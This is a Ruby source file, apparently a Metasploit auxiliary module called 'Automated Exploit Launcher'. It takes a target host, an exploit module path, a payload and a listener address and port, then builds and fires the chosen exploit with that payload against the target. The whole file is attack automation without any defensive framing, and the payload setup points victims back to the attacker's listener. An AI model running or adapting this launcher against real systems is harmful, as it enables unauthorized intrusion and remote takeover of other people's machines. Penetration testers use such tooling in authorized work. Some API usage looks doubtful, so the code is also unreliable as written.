require 'msf/core'

class MetasploitModule < Msf::Auxiliary
  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Automated Exploit Launcher',
      'Description' => %q{
        Automatically launches a chosen exploit with a payload against a specified target.
      },
      'Author'      => ['Your Name'],
      'License'     => MSF_LICENSE
    ))

    register_options([
      Opt::RHOST(),
      OptString.new('EXPLOIT', [true, 'Exploit module path']),
      OptString.new('PAYLOAD', [true, 'Payload module path']),
      Opt::LHOST(),
      Opt::LPORT()
    ])
  end

  def run
    rhost   = datastore['RHOST']
    exploit = datastore['EXPLOIT']
    payload = datastore['PAYLOAD']
    lhost   = datastore['LHOST']
    lport   = datastore['LPORT']

    print_status("Launching exploit #{exploit} against #{rhost} with payload #{payload}")

    # Create exploit module
    exp = framework.exploits.create(exploit)
    exp.datastore['RHOST'] = rhost
    exp.datastore['PAYLOAD'] = payload

    # Create payload module
    pay = framework.payloads.create(payload)
    pay.datastore['LHOST'] = lhost
    pay.datastore['LPORT'] = lport

    # Link the payload
    exp.datastore['LHOST'] = lhost
    exp.datastore['LPORT'] = lport

    # Execute
    exp.exploit_simple(
      'Payload' => pay,
      'Target'  => 0,
      'RunAsJob' => false
    )
  end
end
